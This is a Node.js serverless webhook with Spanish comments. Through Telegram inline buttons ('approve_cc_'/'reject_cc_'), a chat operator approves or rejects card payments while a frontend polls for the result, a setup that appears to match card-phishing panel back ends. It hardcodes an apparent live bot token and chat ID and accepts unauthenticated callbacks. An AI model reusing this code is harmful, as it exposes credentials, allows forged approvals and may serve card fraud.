// /api/webhook.js
const fs = require('fs');
const path = require('path');

// Configuración del bot
const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
const TELEGRAM_CHAT_ID = '-1004294946880';

// Archivo donde se guardan los estados (en Vercel no se puede escribir en disco)
// Usamos una variable global para mantener el estado
let estados = {};

// Función para guardar estado
function guardarEstado(solicitudId, estado) {
    estados[solicitudId] = {
        estado: estado,
        timestamp: Date.now()
    };
}

// Función para obtener estado
function obtenerEstado(solicitudId) {
    return estados[solicitudId] ? estados[solicitudId].estado : 'pending';
}

module.exports = async (req, res) => {
    // ============================================
    // 1. VERIFICAR ESTADO (GET) - El frontend consulta
    // ============================================
    if (req.method === 'GET' && req.query.check) {
        const solicitudId = req.query.check;
        const estado = obtenerEstado(solicitudId);
        return res.status(200).json({ estado, solicitudId });
    }

    // ============================================
    // 2. RECIBIR CALLBACK DE TELEGRAM (POST)
    // ============================================
    if (req.method === 'POST') {
        try {
            const data = req.body;

            // Verificar si es un callback de Telegram
            if (data && data.callback_query) {
                const callback = data.callback_query;
                const callbackData = callback.data;
                const callbackId = callback.id;

                // Extraer solicitudId del callback_data
                const match = callbackData.match(/(approve_cc_|reject_cc_)(.+)/);
                if (!match) {
                    return res.status(200).send('OK');
                }

                const accion = match[1];
                const solicitudId = match[2];

                // Determinar estado
                const estado = accion.includes('approve') ? 'approved' : 'rejected';

                // Guardar estado
                guardarEstado(solicitudId, estado);

                // ============================================
                // 3. RESPONDER A TELEGRAM (Callback Query)
                // ============================================
                const respuesta = {
                    callback_query_id: callbackId,
                    text: estado === 'approved' ? '✅ Pago aprobado' : '❌ Pago rechazado',
                    show_alert: false
                };

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(respuesta)
                });

                // ============================================
                // 4. EDITAR MENSAJE EN TELEGRAM
                // ============================================
                const editText = callback.message.text + '\n\n' + (estado === 'approved' ? '✅ **APROBADO**' : '❌ **RECHAZADO**');
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: editText,
                        parse_mode: 'Markdown'
                    })
                });

                return res.status(200).send('OK');
            }

            return res.status(200).send('OK');
        } catch (error) {
            console.error('Error:', error);
            return res.status(500).json({ error: 'Error interno' });
        }
    }

    // ============================================
    // 5. SI NO ES NINGUNA DE LAS ANTERIORES
    // ============================================
    return res.status(200).send('Webhook activo');
};